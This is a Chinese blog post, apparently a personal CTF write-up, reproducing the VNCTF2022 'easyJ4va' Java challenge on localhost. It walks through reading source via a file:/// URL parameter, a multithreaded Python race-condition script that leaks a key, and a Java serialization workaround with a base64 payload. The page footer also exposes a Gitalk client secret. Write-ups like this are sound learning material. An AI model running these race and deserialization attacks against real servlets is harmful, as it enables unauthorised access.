@@ -1,0 +1,384 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>VNCTF2022_easyJ4va | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="VNCTF2022_easyJ4va | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="VNCTF2022_easyJ4va
+前言
+这次比赛看了这个Java题，赛中没打出来，然后现在来复现，环境关了，用之前读取到的源码重新搭建一下。
+复现
+访问http://localhost:8080/
+
+F12查看一下源码，看到了/file..." />
+    <meta name="keywords" content="Java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              VNCTF2022_easyJ4va
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-02-13
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="vnctf2022_easyj4va">VNCTF2022_easyJ4va</h1>
+<h2 id="前言">前言</h2>
+<p>这次比赛看了这个Java题，赛中没打出来，然后现在来复现，环境关了，用之前读取到的源码重新搭建一下。</p>
+<h2 id="复现">复现</h2>
+<p>访问<code>http://localhost:8080/</code></p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/13/866f320d7a174.png" alt="1644732317340.png" loading="lazy"></figure>
+<p>F12查看一下源码，看到了<code>/file?</code></p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/13/909fa9e89f75d.png" alt="1644732467415.png" loading="lazy"></figure>
+<p>访问<code>http://localhost:8080/file</code></p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/13/e82145e7b91b2.png" alt="1644732692710.png" loading="lazy"></figure>
+<p>让我们输入url，这应该是url作为一个参数，尝试使用<code>file:///协议</code>读取源码。因为这里是自己搭的环境，就读取源码所在路径了。</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/13/1fcc87d68d586.png" alt="1644732961894.png" loading="lazy"></figure>
+<p>一共是有6个class文件，源码文件: https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/13/9b0ad29afab28.zip</p>
+<p>拿到源码后，来审计一下，先来看看<code>HelloWorldServle</code>类</p>
+<pre><code class="language-java">//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+package servlet;
+
+import entity.User;
+import java.io.IOException;
+import java.util.Base64;
+import java.util.Base64.Decoder;
+import javax.servlet.ServletException;
+import javax.servlet.ServletOutputStream;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import util.Secr3t;
+import util.SerAndDe;
+
+@WebServlet(
+        name = &quot;HelloServlet&quot;,
+        urlPatterns = {&quot;/evi1&quot;}
+)
+public class HelloWorldServlet extends HttpServlet {
+    private volatile String name = &quot;m4n_q1u_666&quot;;
+    private volatile String age = &quot;666&quot;;
+    private volatile String height = &quot;180&quot;;
+    User user;
+
+    public HelloWorldServlet() {
+    }
+
+    public void init() throws ServletException {
+        this.user = new User(this.name, this.age, this.height);
+    }
+
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String reqName = req.getParameter(&quot;name&quot;);
+        if (reqName != null) {
+            this.name = reqName;
+        }
+
+        if (Secr3t.check(this.name)) {
+            this.Response(resp, &quot;no vnctf2022!&quot;);
+        } else {
+            if (Secr3t.check(this.name)) {
+                this.Response(resp, &quot;The Key is &quot; + Secr3t.getKey());
+            }
+
+        }
+    }
+
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String key = req.getParameter(&quot;key&quot;);
+        String text = req.getParameter(&quot;base64&quot;);
+        if (Secr3t.getKey().equals(key) &amp;&amp; text != null) {
+            Decoder decoder = Base64.getDecoder();
+            byte[] textByte = decoder.decode(text);
+            User u = (User)SerAndDe.deserialize(textByte);
+            if (this.user.equals(u)) {
+                this.Response(resp, &quot;Deserialize…… Flag is &quot; + Secr3t.getFlag().toString());
+            }
+        } else {
+            this.Response(resp, &quot;KeyError&quot;);
+        }
+
+    }
+
+    private void Response(HttpServletResponse resp, String outStr) throws IOException {
+        ServletOutputStream out = resp.getOutputStream();
+        out.write(outStr.getBytes());
+        out.flush();
+        out.close();
+    }
+}
+</code></pre>
+<p>看到这里，想要获取flag的话，得先获取到key</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/13/cdb086ae9eebb.png" alt="1644735118236.png" loading="lazy"></figure>
+<p>我们跟进到Secr3t类的check方法，发现只是检测传入的name的值是否等于vnctf2022，返回一个布尔值</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/13/c3c6b01c13b18.png" alt="1644735189154.png" loading="lazy"></figure>
+<p>要怎样做到既要满足name等于vnctf2022，来获取key，又不能满足第一个if条件的name=vnctf2022呢?</p>
+<p>来看一下y4师傅前段时间发布的文章: <a href="https://y4tacker.github.io/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98">Servlet的线程安全问题</a></p>
+<p>可以通过多线程条件竞争的方式，一个线程为真，一个线程为假，来达到在那一瞬间，不满足第一个if条件，而满足第二个if条件。写一个python脚本跑一下:</p>
+<pre><code class="language-python">import requests
+import threading
+
+url1 = 'http://localhost:8080/evi1?name=vnctf2022'
+url2 = 'http://localhost:8080/evi1?name=vnctf2021'
+
+def one(session):
+    while event.isSet():
+        res = session.get(url=url1).text
+        if 'Key' in res:
+            print(res)
+            event.clear()
+
+def two(session):
+    while event.isSet():
+        res = session.get(url=url2).text
+        if 'Key' in res:
+            print(res)
+            event.clear()
+
+if __name__ == '__main__':
+    event = threading.Event()
+    event.set()
+    session = requests.session()
+    for i in range(1, 30):
+        threading.Thread(target=one, args=(session,)).start()
+    for i in range(1, 30):
+        threading.Thread(target=two, args=(session,)).start()
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/13/e6027c6cc3fc0.png" alt="1644736409382.png" loading="lazy"></figure>
+<p>得到Key为：<code>TGUxYeaYrS4quWkpW4heavlO8ge8ge8gQ</code>。接下来看一下doPost方法</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/13/b344ec1175763.png" alt="1644736863410.png" loading="lazy"></figure>
+<p>需要传入一个base64，如果key正确，且传入的base64不为空的话，对base64进行解码，然后传入到textByte字节数组中，然后进行反序列化，赋给User对象u，然后将u跟之前实例化的user对象作比较，相等则给出flag。</p>
+<p>我们按照user对象的属性来新建一个对象，并调用SerAndDe的序列化方法，然后进行base64编码，然后试着将其传入题目中的base64</p>
+<pre><code class="language-java">User user = new User(&quot;m4n_q1u_666&quot;,&quot;666&quot;,&quot;180&quot;);
+byte[] X= SerAndDe.serialize(user);
+String text=Base64.getEncoder().encodeToString(X);
+</code></pre>
+<p>但是得到的结果确实null，回到User类中发现，身高属性添加了transient关键字，使其不允许被序列化，所以我们反序列化得到的结果为null。查看到这篇<a href="https://blog.csdn.net/u010156024/article/details/48345257?utm_medium=distribute.wap_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-48345257.wap_agg_so&amp;utm_term=volatile%E5%BA%8F%E5%88%97%E5%8C%96">文章</a></p>
+<p>可以通过重写<code>writeObject</code>方法来绕过，重新赋值一个可序列化的属性给对象</p>
+<pre><code class="language-java">private void writeObject(ObjectOutputStream s) throws IOException{
+    s.defaultWriteObject();
+    s.writeObject(&quot;180&quot;);
+}
+</code></pre>
+<p>随后运行刚刚的代码，发现得到的序列化结果可重新反序列化得到想要的对象属性</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/13/9440f384db8d0.png" alt="1644737537592.png" loading="lazy"></figure>
+<p>payload如下:</p>
+<pre><code>http://localhost:8080/evi1
+post: key=TGUxYeaYrS4quWkpW4heavlO8ge8ge8gQ&amp;base64=rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=
+</code></pre>
+<p>因为是本地搭建的，没有<code>/readflag</code>，所以改为了<code>calc.exe</code>便于更直观的看到效果</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/13/49af186354d80.png" alt="1644737679404.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/13/a7d13d9faa5d2.png" alt="1644737719382.png" loading="lazy"></figure>
+<p>成功弹出计算器，复现结束。感谢<a href="https://fmyyy.gitee.io/">@fmyyy</a>带我呜呜呜！</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#vnctf2022_easyj4va">VNCTF2022_easyJ4va</a>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%A4%8D%E7%8E%B0">复现</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/Real_World_CTF体验赛Writeup/">
+              <h3 class="post-title">
+                RealWorld CTF体验赛Writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
